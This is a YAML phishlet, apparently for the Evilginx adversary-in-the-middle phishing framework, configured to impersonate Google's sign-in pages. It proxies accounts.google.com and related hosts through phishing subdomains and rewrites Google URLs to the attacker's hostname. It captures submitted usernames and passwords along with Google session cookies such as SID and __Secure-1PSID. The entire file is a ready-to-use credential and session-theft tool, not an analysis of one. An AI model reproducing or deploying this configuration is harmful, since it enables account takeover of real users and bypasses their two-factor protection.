author: 'Spacey'
min_ver: '3.3.0'
name: 'GoogleTest3'

proxy_hosts:
  - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'google.com', session: true, is_landing: true, auto_filter: true}
  - {phish_sub: 'www', orig_sub: 'www', domain: 'google.com', session: false, is_landing: false, auto_filter: true}
  - {phish_sub: 'myaccount', orig_sub: 'myaccount', domain: 'google.com', session: false, is_landing: false, auto_filter: true}
  - {phish_sub: 'apis', orig_sub: 'apis', domain: 'google.com', session: false, is_landing: false, auto_filter: true}
  - {phish_sub: 'ssl', orig_sub: 'ssl', domain: 'gstatic.com', session: false, is_landing: false, auto_filter: true}
  - {phish_sub: 'fonts', orig_sub: 'fonts', domain: 'gstatic.com', session: false, is_landing: false, auto_filter: true}

sub_filters:
  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: '\\b(https?://|)(accounts\\.google\\.com)', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
  - {triggers_on: 'accounts.google.com', orig_sub: 'www', domain: 'google.com', search: '\\b(https?://|)(www\\.google\\.com)', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
  - {triggers_on: 'accounts.google.com', orig_sub: 'myaccount', domain: 'google.com', search: '\\b(https?://|)(myaccount\\.google\\.com)', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
  - {triggers_on: 'accounts.google.com', orig_sub: 'ssl', domain: 'gstatic.com', search: '\\b(https?://|)(ssl\\.gstatic\\.com)', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
  - {triggers_on: 'accounts.google.com', orig_sub: 'fonts', domain: 'gstatic.com', search: '\\b(https?://|)(fonts\\.gstatic\\.com)', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}

auth_tokens:
  - domain: '.google.com'
    keys: ['SID', 'SSID', 'APISID', 'SAPISID', 'HSID', '__Secure-1PSID', '__Secure-3PSID', 'ACCOUNT_CHOOSER', 'LSID', '__Secure-1PAPISID', '__Secure-3PAPISID']
    type: 'cookie'

auth_urls:
  - '/v3/signin'
  - '/CheckCookie'
  - '/ManageAccount'

credentials:
  username:
    key: 'identifier'
    search: '(.*)'
    type: 'post'
  password:
    key: 'password'
    search: '(.*)'
    type: 'post'
  custom:
    - key: 'Email'
      search: '(.*)'
      type: 'post'
    - key: 'Passwd'
      search: '(.*)'
      type: 'post'

login:
  domain: 'accounts.google.com'
  path: '/ServiceLogin'
